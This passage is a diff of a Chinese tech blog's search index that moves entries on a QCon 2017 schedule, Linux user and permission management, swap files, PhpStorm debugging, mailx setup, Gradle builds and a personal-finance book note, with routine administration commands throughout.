+<li>09:00 <a href="http://2017.qconbeijing.com/presentation/877">人工智能驱动智慧零售</a> 京东集团副总裁、京东商城研发体系负责人 马松</li>
+</ul>
+<h2 id="推荐系统架构演进-307A"><a href="#推荐系统架构演进-307A" class="headerlink" title="推荐系统架构演进 307A"></a><a href="http://2017.qconbeijing.com/track/126">推荐系统架构演进</a> 307A</h2><ul>
+<li>11:45 <a href="http://2017.qconbeijing.com/presentation/725">今日头条推荐系统架构设计实践</a> 今日头条资深研发工程师 金敬亭</li>
+</ul>
+<h2 id="业务架构那些事-310"><a href="#业务架构那些事-310" class="headerlink" title="业务架构那些事 310"></a><a href="http://2017.qconbeijing.com/track/62">业务架构那些事</a> 310</h2><ul>
+<li>14:00 <a href="http://2017.qconbeijing.com/presentation/759">微信红包后台系统可用性设计实践</a> 腾讯高级工程师 方乐明</li>
+<li>14:55 <a href="http://2017.qconbeijing.com/presentation/660">QQ 空间平台百亿级流量的社交广告系统海量实践</a> 腾讯 QQ 空间营收功能后台技术负责人 冯启航</li>
+<li>16:00 <a href="http://2017.qconbeijing.com/presentation/816">企业代码安全最佳实践</a> 美丽联合集团资深安全专家，Cobra 作者 止介</li>
+<li>16:55 <a href="http://2017.qconbeijing.com/presentation/820">从 Linux 系统内核层面来解决实际问题的实战经验</a> 美丽联合集团蘑菇街技术专家 邵亚方</li>
+</ul>
+<h1 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h1><h2 id="容器应用与工程效率提升（厂商共建）-大会堂A"><a href="#容器应用与工程效率提升（厂商共建）-大会堂A" class="headerlink" title="容器应用与工程效率提升（厂商共建） 大会堂A"></a><a href="http://2017.qconbeijing.com/track/130">容器应用与工程效率提升（厂商共建）</a> 大会堂A</h2><ul>
+<li>09:30 <a href="http://2017.qconbeijing.com/presentation/851">基于 Docker 的全自动化性能测试平台</a> 秦苍科技高级测试工程师 于国庆</li>
+</ul>
+<h2 id="网络信息安全建设最佳实践-307A"><a href="#网络信息安全建设最佳实践-307A" class="headerlink" title="网络信息安全建设最佳实践 307A"></a><a href="http://2017.qconbeijing.com/track/74">网络信息安全建设最佳实践</a> 307A</h2><ul>
+<li>10:30 <a href="http://2017.qconbeijing.com/presentation/720">代码未写，漏洞已出——谈谈设计不当导致的安全问题</a> 腾讯玄武实验室总监 于旸（TK）</li>
+<li>11:25 <a href="http://2017.qconbeijing.com/presentation/618">甲方安全从 0 到 1</a> bilibili 安全团队负责人 吴文灏</li>
+</ul>
+<h2 id="大规模分布式系统架构与实践-310"><a href="#大规模分布式系统架构与实践-310" class="headerlink" title="大规模分布式系统架构与实践 310"></a><a href="http://2017.qconbeijing.com/track/76">大规模分布式系统架构与实践</a> 310</h2><ul>
+<li>13:30 <a href="http://2017.qconbeijing.com/presentation/745">PaxosStore：微信跨数据中心强一致存储系统</a> 微信存储系统主要负责人 曾楚伟</li>
+<li>14:25 <a href="http://2017.qconbeijing.com/presentation/663">从百度文件系统看大型分布式系统设计中的定式与创新</a> 百度搜索架构师 颜世光</li>
+<li>15:30 <a href="http://2017.qconbeijing.com/presentation/646">对 2000 多亿条数据做一次 group by 需要多久？</a> 腾讯社交与效果广告部检索系统组主管 易杰</li>
+</ul>
+<h2 id="17-10-演讲结束"><a href="#17-10-演讲结束" class="headerlink" title="17:10 演讲结束"></a>17:10 演讲结束</h2><blockquote>
+<p>附：</p>
+</blockquote>
+<p><a href="http://2017.qconshanghai.com/schedule">2017上海QCON日程链接</a></p>
+]]></content>
+      <categories>
+        <category>technology</category>
+      </categories>
+      <tags>
+        <tag>QCON</tag>
+        <tag>Conference</tag>
       </tags>
   </entry>
   <entry>
@@ -497,6 +497,22 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux用户(组)及权限管理</title>
+    <url>/technology/2017/09/Linux%E7%94%A8%E6%88%B7-%E7%BB%84-%E5%8F%8A%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/</url>
+    <content><![CDATA[<h1 id="用户-组-管理"><a href="#用户-组-管理" class="headerlink" title="用户(组)管理"></a>用户(组)管理</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新增用户</span></span><br><span class="line">useradd -s /bin/zsh -d /home/$user -m $user</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改用户密码</span></span><br><span class="line">passwd $user</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用户添加到新组</span></span><br><span class="line">usermod -a -G $newGroup $user</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看用户信息信息</span></span><br><span class="line">id $user</span><br><span class="line">uid=1001($user) gid=1001($user) groups=1001($user),33(www-data)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给用户分配组</span></span><br><span class="line">gpasswd -a $user $group</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看用户所属组情况</span></span><br><span class="line">groups $userName</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把用户从组删除</span></span><br><span class="line">gpasswd -d $user $group</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除用户</span></span><br><span class="line">userdel -r $user</span><br></pre></td></tr></table></figure>
+
+<h1 id="用户-组-权限管理"><a href="#用户-组-权限管理" class="headerlink" title="用户(组)权限管理"></a>用户(组)权限管理</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给目录指定所属用户及所属用户组</span></span><br><span class="line">chown -R $user:$group $directory</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给目录指定同组用户的权限</span></span><br><span class="line">chmod -R g+wrx $directory</span><br><span class="line">chmod -R g-wrx $directory</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>technology</category>
+      </categories>
+      <tags>
+        <tag>ops</tag>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux虚拟内存管理</title>
     <url>/technology/2017/09/Linux%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
     <content><![CDATA[<h1 id="管理虚拟内存"><a href="#管理虚拟内存" class="headerlink" title="管理虚拟内存"></a>管理虚拟内存</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先看一下当前内分分布</span></span><br><span class="line">free -m </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始分配虚拟内存</span></span><br><span class="line">mkdir /usr/img/ </span><br><span class="line">rm -rf /usr/img/swap</span><br><span class="line">dd if=/dev/zero of=/usr/img/swap bs=1024 count=2048000</span><br><span class="line">mkswap /usr/img/swap</span><br><span class="line">swapon /usr/img/swap</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看分配虚拟内存后的内存分布</span></span><br><span class="line">free -m</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用完干掉虚拟内存</span></span><br><span class="line">swapoff /usr/img/swap</span><br><span class="line">rm -f /usr/img/swap</span><br></pre></td></tr></table></figure>
@@ -509,6 +525,35 @@
         <tag>虚拟内存</tag>
         <tag>linux</tag>
         <tag>内存管理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Php Storm进行断点调试</title>
+    <url>/technology/2017/07/Php-Storm%E8%BF%9B%E8%A1%8C%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/</url>
+    <content><![CDATA[<p>本文介绍使用在php storm上进行断点调试</p>
+<h3 id="安装xdebug"><a href="#安装xdebug" class="headerlink" title="安装xdebug"></a>安装xdebug</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装xdebug</span></span><br><span class="line">brew install php56-xdebug</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看安装结果</span></span><br><span class="line">php -i</span><br></pre></td></tr></table></figure>
+
+<h3 id="php-storm设置"><a href="#php-storm设置" class="headerlink" title="php storm设置"></a>php storm设置</h3><ol>
+<li><p>配置debug环境,注意端口号要与php.ini中配置的相同（下图为9000端口）</p>
+<p><img src="http://img.willowspace.cn/willowspace_2016/1500902696029.png"></p>
+</li>
+<li><p>设置PHP Web Application</p>
+<p>注意要设置下图中的Absolute path on the server</p>
+</li>
+</ol>
+<p><img src="http://img.willowspace.cn/willowspace_2016/1500902961165.png"></p>
+<p><img src="http://img.willowspace.cn/willowspace_2016/1500903034350.png"></p>
+<p>开始使用断点</p>
+<h3 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h3><p><strong>Q1：断点进入时出现了Remote file path is not mapped to any file path in project</strong></p>
+<p>这是由于PhpStorm不能确定哪个本地文件与debug监听的文件对应，应该不能定位本地的断点。</p>
+<p>可以点击__Click to set up path mappings__按钮设置上文提到的Absolute path on the server，设置完毕即可解决该问题</p>
+]]></content>
+      <categories>
+        <category>technology</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+        <tag>Php-Storm</tag>
       </tags>
   </entry>
   <entry>
@@ -606,35 +651,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Php Storm进行断点调试</title>
-    <url>/technology/2017/07/Php-Storm%E8%BF%9B%E8%A1%8C%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/</url>
-    <content><![CDATA[<p>本文介绍使用在php storm上进行断点调试</p>
-<h3 id="安装xdebug"><a href="#安装xdebug" class="headerlink" title="安装xdebug"></a>安装xdebug</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装xdebug</span></span><br><span class="line">brew install php56-xdebug</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看安装结果</span></span><br><span class="line">php -i</span><br></pre></td></tr></table></figure>
-
-<h3 id="php-storm设置"><a href="#php-storm设置" class="headerlink" title="php storm设置"></a>php storm设置</h3><ol>
-<li><p>配置debug环境,注意端口号要与php.ini中配置的相同（下图为9000端口）</p>
-<p><img src="http://img.willowspace.cn/willowspace_2016/1500902696029.png"></p>
-</li>
-<li><p>设置PHP Web Application</p>
-<p>注意要设置下图中的Absolute path on the server</p>
-</li>
-</ol>
-<p><img src="http://img.willowspace.cn/willowspace_2016/1500902961165.png"></p>
-<p><img src="http://img.willowspace.cn/willowspace_2016/1500903034350.png"></p>
-<p>开始使用断点</p>
-<h3 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h3><p><strong>Q1：断点进入时出现了Remote file path is not mapped to any file path in project</strong></p>
-<p>这是由于PhpStorm不能确定哪个本地文件与debug监听的文件对应，应该不能定位本地的断点。</p>
-<p>可以点击__Click to set up path mappings__按钮设置上文提到的Absolute path on the server，设置完毕即可解决该问题</p>
-]]></content>
-      <categories>
-        <category>technology</category>
-      </categories>
-      <tags>
-        <tag>php</tag>
-        <tag>Php-Storm</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Ubuntu下使用heirloom-mailx发送邮件</title>
     <url>/technology/2017/12/Ubuntu%E4%B8%8B%E4%BD%BF%E7%94%A8heirloom-mailx%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/</url>
     <content><![CDATA[<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">install</span></span><br><span class="line">sudo apt-get install heirloom-mailx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">configure</span></span><br><span class="line">vim /etc/s-nail.rc</span><br><span class="line">set from=$&#123;demo@qq.com&#125;</span><br><span class="line">set smtp=smtps://smtp.qq.com:465</span><br><span class="line">set smtp-auth-user=$&#123;demo@qq.com&#125;</span><br><span class="line">set smtp-auth-password=$&#123;password&#125;</span><br><span class="line">set smtp-auth=login</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">send mail</span></span><br><span class="line">echo &quot;mail content&quot; | mail -vs &quot;mail subject&quot; $&#123;target@mail.com&#125;</span><br></pre></td></tr></table></figure>
@@ -648,22 +664,6 @@
         <tag>linux</tag>
         <tag>ubuntu</tag>
         <tag>monitor</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux用户(组)及权限管理</title>
-    <url>/technology/2017/09/Linux%E7%94%A8%E6%88%B7-%E7%BB%84-%E5%8F%8A%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/</url>
-    <content><![CDATA[<h1 id="用户-组-管理"><a href="#用户-组-管理" class="headerlink" title="用户(组)管理"></a>用户(组)管理</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新增用户</span></span><br><span class="line">useradd -s /bin/zsh -d /home/$user -m $user</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改用户密码</span></span><br><span class="line">passwd $user</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用户添加到新组</span></span><br><span class="line">usermod -a -G $newGroup $user</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看用户信息信息</span></span><br><span class="line">id $user</span><br><span class="line">uid=1001($user) gid=1001($user) groups=1001($user),33(www-data)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给用户分配组</span></span><br><span class="line">gpasswd -a $user $group</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看用户所属组情况</span></span><br><span class="line">groups $userName</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把用户从组删除</span></span><br><span class="line">gpasswd -d $user $group</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除用户</span></span><br><span class="line">userdel -r $user</span><br></pre></td></tr></table></figure>
-
-<h1 id="用户-组-权限管理"><a href="#用户-组-权限管理" class="headerlink" title="用户(组)权限管理"></a>用户(组)权限管理</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给目录指定所属用户及所属用户组</span></span><br><span class="line">chown -R $user:$group $directory</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给目录指定同组用户的权限</span></span><br><span class="line">chmod -R g+wrx $directory</span><br><span class="line">chmod -R g-wrx $directory</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>technology</category>
-      </categories>
-      <tags>
-        <tag>ops</tag>
-        <tag>linux</tag>
       </tags>
   </entry>
   <entry>
@@ -784,6 +784,54 @@
       </categories>
       <tags>
         <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>gradle_quick_start</title>
+    <url>/technology/2017/01/gradle-quick-start/</url>
+    <content><![CDATA[<p>本文介绍使用Gradle快速构建Java项目</p>
+<p>由于博主使用的是Intellj IDEA，所以如果你对Intellj IDEA的项目结构不熟悉，那你可能需要先了解一下Intellj IDEA的项目结构：一个project（区别eclipse中的project）+ 多个modules，以下图为例，spring-boot-rmi是项目，greenqiang,laowang,oldwang,xiaoming是4个module</p>
+<p><img src="http://img.willowspace.cn/willowspace_2016/1485234708330.png"></p>
+<h2 id="Gradle准备"><a href="#Gradle准备" class="headerlink" title="Gradle准备"></a>Gradle准备</h2><ul>
+<li>安装jdk或者jre，且版本至少是6以上</li>
+<li>从<a href="https://gradle.org/">官网</a>安装gradle</li>
+</ul>
+<h2 id="配置文件与构建脚本"><a href="#配置文件与构建脚本" class="headerlink" title="配置文件与构建脚本"></a>配置文件与构建脚本</h2><p>使用gradle构建项目，项目根目录下会有build.gradle和settings.gradle两个文件(如上图)</p>
+<p><strong>settings.gradle</strong> 配置文件</p>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">//多项目（或多modules）管理</span></span><br><span class="line"><span class="comment">//rootProject.name = &quot;spring-boot-rmi&quot; //根项目</span></span><br><span class="line">include <span class="string">&quot;old-wang&quot;</span>, <span class="string">&quot;green-qiang&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>build.gradle</strong> 构建脚本</p>
+<ul>
+<li>根目录下的构建脚本 &#x2F;build.gradle</li>
+</ul>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">//项目基本信息</span></span><br><span class="line">group <span class="string">&#x27;cn.willowspace&#x27;</span></span><br><span class="line">version <span class="string">&#x27;1.0-SNAPSHOT&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//allprojects or subprojects</span></span><br><span class="line">allprojects &#123;</span><br><span class="line">  	<span class="comment">//应用插件</span></span><br><span class="line">    apply <span class="attr">plugin:</span> <span class="string">&#x27;java&#x27;</span></span><br><span class="line">	<span class="comment">//指定编译级别</span></span><br><span class="line">    sourceCompatibility = <span class="number">1.8</span></span><br><span class="line">    targetCompatibility = <span class="number">1.8</span></span><br><span class="line">	<span class="comment">//指定依赖仓库</span></span><br><span class="line">    repositories &#123;</span><br><span class="line">        mavenLocal()</span><br><span class="line">        mavenCentral()</span><br><span class="line">        maven &#123;</span><br><span class="line">            url <span class="string">&#x27;http://repo.spring.io/libs-milestone/&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//依赖管理</span></span><br><span class="line">    dependencies &#123;</span><br><span class="line">        <span class="comment">//spring-boot-starter-parent</span></span><br><span class="line">        compile <span class="attr">group:</span> <span class="string">&#x27;org.springframework.boot&#x27;</span>, <span class="attr">name:</span> <span class="string">&#x27;spring-boot&#x27;</span>, <span class="attr">version:</span> <span class="string">&#x27;1.2.8.RELEASE&#x27;</span></span><br><span class="line">        compile <span class="attr">group:</span> <span class="string">&#x27;org.springframework.boot&#x27;</span>, <span class="attr">name:</span> <span class="string">&#x27;spring-boot-starter-web&#x27;</span>, <span class="attr">version:</span> <span class="string">&#x27;1.2.8.RELEASE&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>old-wang子项目的构建脚本 old-wang&#x2F;build.gradle</li>
+</ul>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">//指定项目的源码及资源文件路径</span></span><br><span class="line">sourceSets &#123;</span><br><span class="line">    main &#123;</span><br><span class="line">        java &#123;</span><br><span class="line">            srcDir <span class="string">&#x27;old-wang/src/main/java&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resources &#123;</span><br><span class="line">            srcDir <span class="string">&#x27;old-wang/src/main/resources&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>green-qiang子项目的构建脚本 green-qiang&#x2F;build.gradle</li>
+</ul>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">//指定项目的源码及资源文件路径</span></span><br><span class="line">sourceSets &#123;</span><br><span class="line">    main &#123;</span><br><span class="line">        java &#123;</span><br><span class="line">            srcDir <span class="string">&#x27;green-qiang/src/main/java&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resources &#123;</span><br><span class="line">            srcDir <span class="string">&#x27;green-qiang/src/main/resources&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过settings.gradle及build.gradle两类文件，我们就可以建立起项目之间的依赖及第三方依赖，一个java项目的基本构建就完成了。</p>
+<p>更多gradle相关的用法，参考<a href="https://www.gitbook.com/book/dongchuan/gradle-user-guide-/details">Gradle User Guide 中文版</a></p>
+<p><a href="http://www.jetbrains.com/help/idea/2016.3/gradle-2.html">IDEA中Gradle的设置</a> ,特别注意：不要在IDEA里开启offline work选项，否则你可能经常找不到你要的dependencies</p>
+<blockquote>
+<ul>
+<li>Offline work - use this check box to work with Gradle in the offline mode. In this case Gradle will use dependencies from the cache. Gradle will not attempt to access the network to perform dependency resolution. If required dependencies are not present in the dependencies’ cache, a build execution will fail.</li>
+</ul>
+</blockquote>
+]]></content>
+      <categories>
+        <category>technology</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+        <tag>gradle</tag>
+        <tag>maven</tag>
       </tags>
   </entry>
   <entry>
@@ -954,54 +1002,6 @@
         <tag>持续集成</tag>
         <tag>CI</tag>
         <tag>jenkins</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>gradle_quick_start</title>
-    <url>/technology/2017/01/gradle-quick-start/</url>
-    <content><![CDATA[<p>本文介绍使用Gradle快速构建Java项目</p>
-<p>由于博主使用的是Intellj IDEA，所以如果你对Intellj IDEA的项目结构不熟悉，那你可能需要先了解一下Intellj IDEA的项目结构：一个project（区别eclipse中的project）+ 多个modules，以下图为例，spring-boot-rmi是项目，greenqiang,laowang,oldwang,xiaoming是4个module</p>
-<p><img src="http://img.willowspace.cn/willowspace_2016/1485234708330.png"></p>
-<h2 id="Gradle准备"><a href="#Gradle准备" class="headerlink" title="Gradle准备"></a>Gradle准备</h2><ul>
-<li>安装jdk或者jre，且版本至少是6以上</li>
-<li>从<a href="https://gradle.org/">官网</a>安装gradle</li>
-</ul>
-<h2 id="配置文件与构建脚本"><a href="#配置文件与构建脚本" class="headerlink" title="配置文件与构建脚本"></a>配置文件与构建脚本</h2><p>使用gradle构建项目，项目根目录下会有build.gradle和settings.gradle两个文件(如上图)</p>
-<p><strong>settings.gradle</strong> 配置文件</p>
-<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">//多项目（或多modules）管理</span></span><br><span class="line"><span class="comment">//rootProject.name = &quot;spring-boot-rmi&quot; //根项目</span></span><br><span class="line">include <span class="string">&quot;old-wang&quot;</span>, <span class="string">&quot;green-qiang&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>build.gradle</strong> 构建脚本</p>
-<ul>
-<li>根目录下的构建脚本 &#x2F;build.gradle</li>
-</ul>
-<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">//项目基本信息</span></span><br><span class="line">group <span class="string">&#x27;cn.willowspace&#x27;</span></span><br><span class="line">version <span class="string">&#x27;1.0-SNAPSHOT&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//allprojects or subprojects</span></span><br><span class="line">allprojects &#123;</span><br><span class="line">  	<span class="comment">//应用插件</span></span><br><span class="line">    apply <span class="attr">plugin:</span> <span class="string">&#x27;java&#x27;</span></span><br><span class="line">	<span class="comment">//指定编译级别</span></span><br><span class="line">    sourceCompatibility = <span class="number">1.8</span></span><br><span class="line">    targetCompatibility = <span class="number">1.8</span></span><br><span class="line">	<span class="comment">//指定依赖仓库</span></span><br><span class="line">    repositories &#123;</span><br><span class="line">        mavenLocal()</span><br><span class="line">        mavenCentral()</span><br><span class="line">        maven &#123;</span><br><span class="line">            url <span class="string">&#x27;http://repo.spring.io/libs-milestone/&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//依赖管理</span></span><br><span class="line">    dependencies &#123;</span><br><span class="line">        <span class="comment">//spring-boot-starter-parent</span></span><br><span class="line">        compile <span class="attr">group:</span> <span class="string">&#x27;org.springframework.boot&#x27;</span>, <span class="attr">name:</span> <span class="string">&#x27;spring-boot&#x27;</span>, <span class="attr">version:</span> <span class="string">&#x27;1.2.8.RELEASE&#x27;</span></span><br><span class="line">        compile <span class="attr">group:</span> <span class="string">&#x27;org.springframework.boot&#x27;</span>, <span class="attr">name:</span> <span class="string">&#x27;spring-boot-starter-web&#x27;</span>, <span class="attr">version:</span> <span class="string">&#x27;1.2.8.RELEASE&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>old-wang子项目的构建脚本 old-wang&#x2F;build.gradle</li>
-</ul>
-<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">//指定项目的源码及资源文件路径</span></span><br><span class="line">sourceSets &#123;</span><br><span class="line">    main &#123;</span><br><span class="line">        java &#123;</span><br><span class="line">            srcDir <span class="string">&#x27;old-wang/src/main/java&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resources &#123;</span><br><span class="line">            srcDir <span class="string">&#x27;old-wang/src/main/resources&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>green-qiang子项目的构建脚本 green-qiang&#x2F;build.gradle</li>
-</ul>
-<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">//指定项目的源码及资源文件路径</span></span><br><span class="line">sourceSets &#123;</span><br><span class="line">    main &#123;</span><br><span class="line">        java &#123;</span><br><span class="line">            srcDir <span class="string">&#x27;green-qiang/src/main/java&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resources &#123;</span><br><span class="line">            srcDir <span class="string">&#x27;green-qiang/src/main/resources&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过settings.gradle及build.gradle两类文件，我们就可以建立起项目之间的依赖及第三方依赖，一个java项目的基本构建就完成了。</p>
-<p>更多gradle相关的用法，参考<a href="https://www.gitbook.com/book/dongchuan/gradle-user-guide-/details">Gradle User Guide 中文版</a></p>
-<p><a href="http://www.jetbrains.com/help/idea/2016.3/gradle-2.html">IDEA中Gradle的设置</a> ,特别注意：不要在IDEA里开启offline work选项，否则你可能经常找不到你要的dependencies</p>
-<blockquote>
-<ul>
-<li>Offline work - use this check box to work with Gradle in the offline mode. In this case Gradle will use dependencies from the cache. Gradle will not attempt to access the network to perform dependency resolution. If required dependencies are not present in the dependencies’ cache, a build execution will fail.</li>
-</ul>
-</blockquote>
-]]></content>
-      <categories>
-        <category>technology</category>
-      </categories>
-      <tags>
-        <tag>java</tag>
-        <tag>gradle</tag>
-        <tag>maven</tag>
       </tags>
   </entry>
   <entry>
@@ -1638,45 +1638,6 @@
       </tags>
   </entry>
   <entry>
-    <title>从零开始学理财</title>
-    <url>/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/2017/02/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E7%90%86%E8%B4%A2/</url>
-    <content><![CDATA[<p>最近读了张鹤的《从零开始学理财》。张鹤是著名的财经作家和理财专家，撰写过《成功理财的16堂课》《银行投资理财赚钱法》等理财类的畅销书。</p>
-<p>书中介绍了理财的基本概念、常见的误区和实用的理财技巧。其中的__水库模型__和__资产4321分配法__让理财新手能够快速上手理财。</p>
-<h2 id="一、理财的基本概念"><a href="#一、理财的基本概念" class="headerlink" title="一、理财的基本概念"></a>一、理财的基本概念</h2><p>理财是一个系统的工程，它由__收入__、__消费__、__储蓄__、__投资__、__负债__和__保险__6部分构成</p>
-<h2 id="二、水库模型"><a href="#二、水库模型" class="headerlink" title="二、水库模型"></a>二、水库模型</h2><p>书中用一个基本的理财模型：水库，形象的描述了理财6个构成部分之间的关系。</p>
-<blockquote>
-<p>想象自己有一个水库，你每个月都要朝水库里灌水，这就是__收入__。水库的一侧还有一个大坝，衣食住行都会让水从大坝往外流，是你的__消费__。水库里的存水是你的__储蓄__，水库旁边还有一口井，可以慢慢向你的水库里注水，这就是你的__投资__。如果水库干了，向别人借水，这个是__负债__，还水的时候要多给一些，就是__利息__。为了防止意外发生得稳固大坝，就需要__保险__。</p>
-</blockquote>
-<h2 id="三、最低目标：财务自由"><a href="#三、最低目标：财务自由" class="headerlink" title="三、最低目标：财务自由"></a>三、最低目标：财务自由</h2><p>合理的分配6个部分的比例，构建牢固的“水库”。最终我们可以达到最低目标：__财务自由__。</p>
-<p>所谓财务自由是指： 理财的被动收入高于最低消费的财富自由状态</p>
-<p>之所以把财务自由作为最低目标是我个人观点，因为只有财务自由了，才可以不用靠出卖劳动力去获得生活成本，才算是脱离了生存压力，生活才有了选择权，是自由的，而自由的生活是我的最低目标。</p>
-<h2 id="四、误区"><a href="#四、误区" class="headerlink" title="四、误区"></a>四、误区</h2><h3 id="1-没钱就不理财"><a href="#1-没钱就不理财" class="headerlink" title="1. 没钱就不理财"></a>1. 没钱就不理财</h3><p>没钱更要先建立理财观念，系统性地提高收入，节约开支，增加储蓄，持续投资，清理负债，设置保险。</p>
-<p>可以先投资自己，把钱投入到提升自己的技能和素质提高上。关注投资界信息，交学费积累经验。给自己买一份保险，把防水的闸门修得牢固一些。</p>
-<h3 id="2-钱是挣来的，不是攒出来的"><a href="#2-钱是挣来的，不是攒出来的" class="headerlink" title="2. 钱是挣来的，不是攒出来的"></a>2. 钱是挣来的，不是攒出来的</h3><p>攒钱有2个好处，一个是可以给你积累本金，能让你在看准机会的时候能出手。另一部分好处是能避免急功近利的心态。最成功的投资基本上都是长线投资。</p>
-<h3 id="3-理财就是整天关注理财产品"><a href="#3-理财就是整天关注理财产品" class="headerlink" title="3. 理财就是整天关注理财产品"></a>3. 理财就是整天关注理财产品</h3><p>时刻关注自己的理财产品会增加时间的<span id="back_1"><a href="#1">[1]</a>沉没成本</span>。好的投资策略往往是盯着一个看好产品，然后长期持有，不要频繁更换。</p>
-<p>个人认为时间本身就是最昂贵的资产，如果一项投资(学习、认知除外)需要占用你大量的时间，那便是不划算的。</p>
-<h2 id="五、四三二一资产分配法"><a href="#五、四三二一资产分配法" class="headerlink" title="五、四三二一资产分配法"></a>五、四三二一资产分配法</h2><p>书中提到了一种适用于理财新手的资产分配方法：4321资产分配法。它是基于恒定混合性策略，即保持<span id="back_2"><a href="#2">[2]</a>投资组合</span>中各类资产的比例固定。</p>
